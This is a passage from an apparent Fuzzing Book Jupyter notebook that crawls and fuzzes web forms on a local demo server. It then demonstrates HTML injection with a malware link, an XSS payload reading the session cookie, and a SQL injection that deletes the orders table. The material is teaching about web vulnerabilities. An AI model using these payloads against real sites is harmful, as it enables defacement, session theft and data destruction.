       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ExpectError.html\">https://www.fuzzingbook.org/html/ExpectError.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Timer.html\">https://www.fuzzingbook.org/html/Timer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ControlFlow.html\">https://www.fuzzingbook.org/html/ControlFlow.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/RailroadDiagrams.html\">https://www.fuzzingbook.org/html/RailroadDiagrams.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/00_Index.html\">https://www.fuzzingbook.org/html/00_Index.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/dist/fuzzingbook-code.zip\">https://www.fuzzingbook.org/dist/fuzzingbook-code.zip</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip\">https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ReleaseNotes.html\">https://www.fuzzingbook.org/html/ReleaseNotes.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Importing.html\">https://www.fuzzingbook.org/html/Importing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/slides/Fuzzer.slides.html\">https://www.fuzzingbook.org/slides/Fuzzer.slides.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Guide_for_Authors.html\">https://www.fuzzingbook.org/html/Guide_for_Authors.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for url in crawl(\"https://www.fuzzingbook.org/\"):\n",
    "    print_url(url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Once we have crawled over all the links of a site, we can generate tests for all the forms we found:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.754914Z",
     "iopub.status.busy": "2021-11-01T22:34:04.754333Z",
     "iopub.status.idle": "2021-11-01T22:34:04.807686Z",
     "shell.execute_reply": "2021-11-01T22:34:04.808056Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('http://127.0.0.1:8800/terms', 'PASS')\n",
      "('http://127.0.0.1:8800/order?item=tshirt&name=+&email=b+%742%40+&city=%45%39&zip=54&terms=on&submit=', 'PASS')\n",
      "('http://127.0.0.1:8800/order?item=drill&name=%52-&email=e%40%3f&city=+&zip=5&terms=on&submit=', 'PASS')\n"
     ]
    }
   ],
   "source": [
    "for url in crawl(httpd_url, max_pages=float('inf')):\n",
    "    web_form_fuzzer = WebFormFuzzer(url)\n",
    "    web_form_runner = WebRunner(url)\n",
    "    print(web_form_fuzzer.run(web_form_runner))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "For even better effects, one could integrate crawling and fuzzing – and also analyze the order confirmation pages for further links.  We leave this to the reader as an exercise."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us get rid of any server messages accumulated above:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.811321Z",
     "iopub.status.busy": "2021-11-01T22:34:04.810766Z",
     "iopub.status.idle": "2021-11-01T22:34:04.813214Z",
     "shell.execute_reply": "2021-11-01T22:34:04.813576Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "clear_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Crafting Web Attacks\n",
    "\n",
    "Before we close the chapter, let us take a look at a special class of \"uncommon\" inputs that not only yield generic failures, but actually allow _attackers_ to manipulate the server at their will.  We will illustrate three common attacks using our server, which (surprise) actually turns out to be vulnerable against all of them."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### HTML Injection Attacks\n",
    "\n",
    "The first kind of attack we look at is *HTML injection*.  The idea of HTML injection is to supply the Web server with _data that can also be interpreted as HTML_.  If this HTML data is then displayed to users in their Web browsers, it can serve malicious purposes, although (seemingly) originating from a reputable site.  If this data is also _stored_, it becomes a _persistent_ attack; the attacker does not even have to lure victims towards specific pages."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Here is an example of a (simple) HTML injection.  For the `name` field, we not only use plain text, but also embed HTML tags – in this case, a link towards a malware-hosting site."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.816841Z",
     "iopub.status.busy": "2021-11-01T22:34:04.816329Z",
     "iopub.status.idle": "2021-11-01T22:34:04.818018Z",
     "shell.execute_reply": "2021-11-01T22:34:04.818385Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import extend_grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.821556Z",
     "iopub.status.busy": "2021-11-01T22:34:04.821046Z",
     "iopub.status.idle": "2021-11-01T22:34:04.822793Z",
     "shell.execute_reply": "2021-11-01T22:34:04.823240Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR_WITH_HTML_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode('''\n",
    "    Jane Doe<p>\n",
    "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
    "    </p>\n",
    "    ''')],\n",
    "})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "If we use this grammar to create inputs, the resulting URL will have all of the HTML encoded in:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.827872Z",
     "iopub.status.busy": "2021-11-01T22:34:04.827346Z",
     "iopub.status.idle": "2021-11-01T22:34:04.829539Z",
     "shell.execute_reply": "2021-11-01T22:34:04.829977Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=drill&name=%0a++++Jane+Doe%3cp%3e%0a++++%3cstrong%3e%3ca+href%3d%22www.lots.of.malware%22%3eClick+here+for+cute+cat+pictures!%3c%2fa%3e%3c%2fstrong%3e%0a++++%3c%2fp%3e%0a++++&email=j_smith%40example.com&city=Seattle&zip=02805'"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_HTML_INJECTION)\n",
    "order_with_injected_html = html_injection_fuzzer.fuzz()\n",
    "order_with_injected_html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What hapens if we send this string to our Web server?  It turns out that the HTML is left in the confirmation page and shown as link.  This also happens in the log:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.833179Z",
     "iopub.status.busy": "2021-11-01T22:34:04.832633Z",
     "iopub.status.idle": "2021-11-01T22:34:04.842520Z",
     "shell.execute_reply": "2021-11-01T22:34:04.842899Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:04] INSERT INTO orders VALUES ('drill', '\n",
       "    Jane Doe<p>\n",
       "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
       "    </p>\n",
       "    ', 'j_smith@example.com', 'Seattle', '02805')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:04] \"GET /order?item=drill&name=%0A++++Jane+Doe%3Cp%3E%0A++++%3Cstrong%3E%3Ca+href%3D%22www.lots.of.malware%22%3EClick+here+for+cute+cat+pictures!%3C%2Fa%3E%3C%2Fstrong%3E%0A++++%3C%2Fp%3E%0A++++&email=j_smith%40example.com&city=Seattle&zip=02805 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Rotary Hammer</strong> to \n",
       "    Jane Doe<p>\n",
       "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
       "    </p>\n",
       "     in Seattle, 02805<br>\n",
       "  A confirmation mail will be sent to j_smith@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 132,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, order_with_injected_html)))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Since the link seemingly comes from a trusted origin, users are much more likely to follow it.  The link is even persistent, as it is stored in the database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.846619Z",
     "iopub.status.busy": "2021-11-01T22:34:04.846024Z",
     "iopub.status.idle": "2021-11-01T22:34:04.848090Z",
     "shell.execute_reply": "2021-11-01T22:34:04.848528Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('drill', '\\n    Jane Doe<p>\\n    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\\n    </p>\\n    ', 'j_smith@example.com', 'Seattle', '02805')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders WHERE name LIKE '%<%'\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "This means that anyone ever querying the database (for instance, operators processing the order) will also see the link, multiplying its impact.  By carefully crafting the injected HTML, one can thus expose malicious content to a large number of users – until the injected HTML is finally deleted."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Cross-Site Scripting Attacks\n",
    "\n",
    "If one can inject HTML code into a Web page, one can also inject *JavaScript* code as part of the injected HTML.  This code would then be executed as soon as the injected HTML is rendered.   \n",
    "\n",
    "This is particularly dangerous because executed JavaScript always executes in the _origin_ of the page which contains it. Therefore, an attacker can normally not force a user to run JavaScript in any origin he does not control himself. When an attacker, however, can inject his code into a vulnerable Web application, he can have the client run the code with the (trusted) Web application as origin.\n",
    "\n",
    "In such a *cross-site scripting* (*XSS*) attack, the injected script can do a lot more than just plain HTML.  For instance, the code can access sensitive page content or session cookies.  If the code in question runs in the operator's browser (for instance, because an operator is reviewing the list of orders), it could retrieve any other information shown on the screen and thus steal order details for a variety of customers."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Here is a very simple example of a script injection.  Whenever the name is displayed, it causes the browser to \"steal\" the current *session cookie* – the piece of data the browser uses to identify the user with the server.  In our case, we could steal the cookie of the Jupyter session."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.852217Z",
     "iopub.status.busy": "2021-11-01T22:34:04.851690Z",
     "iopub.status.idle": "2021-11-01T22:34:04.853316Z",
     "shell.execute_reply": "2021-11-01T22:34:04.853691Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR_WITH_XSS_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode('Jane Doe' +\n",
    "                          '<script>' +\n",
    "                          'document.title = document.cookie.substring(0, 10);' +\n",
    "                          '</script>')\n",
    "               ],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.858165Z",
     "iopub.status.busy": "2021-11-01T22:34:04.857603Z",
     "iopub.status.idle": "2021-11-01T22:34:04.859855Z",
     "shell.execute_reply": "2021-11-01T22:34:04.860237Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'"
      ]
     },
     "execution_count": 135,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_XSS_INJECTION)\n",
    "order_with_injected_xss = xss_injection_fuzzer.fuzz()\n",
    "order_with_injected_xss"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.863906Z",
     "iopub.status.busy": "2021-11-01T22:34:04.863354Z",
     "iopub.status.idle": "2021-11-01T22:34:04.865693Z",
     "shell.execute_reply": "2021-11-01T22:34:04.866063Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'"
      ]
     },
     "execution_count": 136,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url_with_injected_xss = urljoin(httpd_url, order_with_injected_xss)\n",
    "url_with_injected_xss"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.869308Z",
     "iopub.status.busy": "2021-11-01T22:34:04.868740Z",
     "iopub.status.idle": "2021-11-01T22:34:04.876463Z",
     "shell.execute_reply": "2021-11-01T22:34:04.876836Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Lock Set</strong> to Jane Doe<script>document.title = document.cookie.substring(0, 10);</script> in Seattle, 34506<br>\n",
       "  A confirmation mail will be sent to j.doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(url_with_injected_xss, mute=True))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The message looks as always – but if you have a look at your browser title, it should now show the first 10 characters of your \"secret\" notebook cookie.  Instead of showing its prefix in the title, the script could also silently send the cookie to a remote server, allowing attackers to highjack your current notebook session and interact with the server on your behalf.  It could also go and access and send any other data that is shown in your browser or otherwise available.  It could run a *keylogger* and steal passwords and other sensitive data as it is typed in.  Again, it will do so every time the compromised order with Jane Doe's name is shown in the browser and the associated script is executed."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us go and reset the title to a less sensitive value:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.880421Z",
     "iopub.status.busy": "2021-11-01T22:34:04.879876Z",
     "iopub.status.idle": "2021-11-01T22:34:04.882191Z",
     "shell.execute_reply": "2021-11-01T22:34:04.882553Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<script>document.title = \"Jupyter\"</script>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML('<script>document.title = \"Jupyter\"</script>')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### SQL Injection Attacks\n",
    "\n",
    "Cross-site scripts have the same privileges as web pages – most notably, they cannot access or change data outside of your browser.  So-called *SQL injection* targets _databases_, allowing to inject commands that can read or modify data in the database, or change the purpose of the original query."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "To understand how SQL injection works, let us take a look at the code that produces the SQL command to insert a new order into the database:\n",
    "\n",
    "```python\n",
    "sql_command = (\"INSERT INTO orders \" +\n",
    "    \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\n",
    "```\n",
    "\n",
    "What happens if any of the values (say, `name`) has a value that _can also be interpreted as a SQL command?_  Then, instead of the intended `INSERT` command, we would execute the command imposed by `name`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us illustrate this by an example.  We set the individual values as they would be found during execution:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.885866Z",
     "iopub.status.busy": "2021-11-01T22:34:04.885360Z",
     "iopub.status.idle": "2021-11-01T22:34:04.887033Z",
     "shell.execute_reply": "2021-11-01T22:34:04.887393Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "values = {\n",
    "    \"item\": \"tshirt\",\n",
    "    \"name\": \"Jane Doe\",\n",
    "    \"email\": \"j.doe@example.com\",\n",
    "    \"city\": \"Seattle\",\n",
    "    \"zip\": \"98104\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "and format the string as seen above:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.890833Z",
     "iopub.status.busy": "2021-11-01T22:34:04.890323Z",
     "iopub.status.idle": "2021-11-01T22:34:04.892444Z",
     "shell.execute_reply": "2021-11-01T22:34:04.892807Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'j.doe@example.com', 'Seattle', '98104')\""
      ]
     },
     "execution_count": 140,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_command = (\"INSERT INTO orders \" +\n",
    "               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\n",
    "sql_command"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "All fine, right?  But now, we define a very \"special\" name that can also be interpreted as a SQL command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.895868Z",
     "iopub.status.busy": "2021-11-01T22:34:04.895361Z",
     "iopub.status.idle": "2021-11-01T22:34:04.896892Z",
     "shell.execute_reply": "2021-11-01T22:34:04.897405Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "values[\"name\"] = \"Jane', 'x', 'x', 'x'); DELETE FROM orders; -- \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.900791Z",
     "iopub.status.busy": "2021-11-01T22:34:04.900281Z",
     "iopub.status.idle": "2021-11-01T22:34:04.902626Z",
     "shell.execute_reply": "2021-11-01T22:34:04.903059Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"INSERT INTO orders VALUES ('tshirt', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; -- ', 'j.doe@example.com', 'Seattle', '98104')\""
      ]
     },
     "execution_count": 142,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_command = (\"INSERT INTO orders \" +\n",
    "               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\n",
    "sql_command"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "What happens here is that we now get a command to insert values into the database (with a few \"dummy\" values `x`), followed by a SQL `DELETE` command that would _delete all entries_ of the orders table.  The string `-- ` starts a SQL _comment_ such that the remainder of the original query would be easily ignored.  By crafting strings that can also be interpreted as SQL commands, attackers can alter or delete database data, bypass authentication mechanisms and many more."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Is our server also vulnerable to such attacks?  Of course it is.  We create a special grammar such that we can set the `<name>` parameter to a string with SQL injection, just as shown above."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.906173Z",
     "iopub.status.busy": "2021-11-01T22:34:04.905608Z",
     "iopub.status.idle": "2021-11-01T22:34:04.907147Z",
     "shell.execute_reply": "2021-11-01T22:34:04.907705Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import extend_grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.910761Z",
     "iopub.status.busy": "2021-11-01T22:34:04.910250Z",
     "iopub.status.idle": "2021-11-01T22:34:04.912004Z",
     "shell.execute_reply": "2021-11-01T22:34:04.912372Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR_WITH_SQL_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode(\"Jane', 'x', 'x', 'x'); DELETE FROM orders; --\")],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.916568Z",
     "iopub.status.busy": "2021-11-01T22:34:04.915987Z",
     "iopub.status.idle": "2021-11-01T22:34:04.918212Z",
     "shell.execute_reply": "2021-11-01T22:34:04.918631Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/order?item=drill&name=Jane',+'x',+'x',+'x')%3b+DELETE+FROM+orders%3b+--&email=j.doe%40example.com&city=New+York&zip=14083\""
      ]
     },
     "execution_count": 145,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_SQL_INJECTION)\n",
    "order_with_injected_sql = sql_injection_fuzzer.fuzz()\n",
    "order_with_injected_sql"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "These are the current orders:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.921699Z",
     "iopub.status.busy": "2021-11-01T22:34:04.921174Z",
     "iopub.status.idle": "2021-11-01T22:34:04.923725Z",
     "shell.execute_reply": "2021-11-01T22:34:04.924107Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631'), ('drill', 'Jane Doe', 'j.doe@example.com', '', '45732'), ('drill', 'Jane Doe', 'j,doe@example.com', 'Seattle', '45732'), ('drill', ' ', '5F @p   a ', 'cdb', '3230'), ('drill', ' m', '@@0', 'd', '9'), ('lockset', '  ', 'c@d', '_', '6'), ('lockset', ' ', 'd@_-', '2  0', '1040'), ('tshirt', 'Kb', 'm@ ', 'zy ', '13'), ('lockset', 'd', 'U @t', ' ', '4'), ('tshirt', '_ 2', '1  @ ', ' ', '30'), ('tshirt', ' ', 'a-@ ', ' W', '2'), ('lockset', 'V', '  @aUeeD', ' ', '01'), ('tshirt', 'oc', '  @ ', 'a', '25'), ('drill', '55', '3>@@5', 'L', '0'), ('tshirt', ' ', 'b t2@ ', 'E9', '54'), ('drill', 'R-', 'e@?', ' ', '5'), ('drill', '\\n    Jane Doe<p>\\n    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\\n    </p>\\n    ', 'j_smith@example.com', 'Seattle', '02805'), ('lockset', 'Jane Doe<script>document.title = document.cookie.substring(0, 10);</script>', 'j.doe@example.com', 'Seattle', '34506')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us go and send our URL with SQL injection to the server.  From the log, we see that the \"malicious\" SQL command is formed just as sketched above, and executed, too."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:04.928062Z",
     "iopub.status.busy": "2021-11-01T22:34:04.927221Z",
     "iopub.status.idle": "2021-11-01T22:34:04.936996Z",
     "shell.execute_reply": "2021-11-01T22:34:04.937368Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:04] INSERT INTO orders VALUES ('drill', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; --', 'j.doe@example.com', 'New York', '14083')\n",
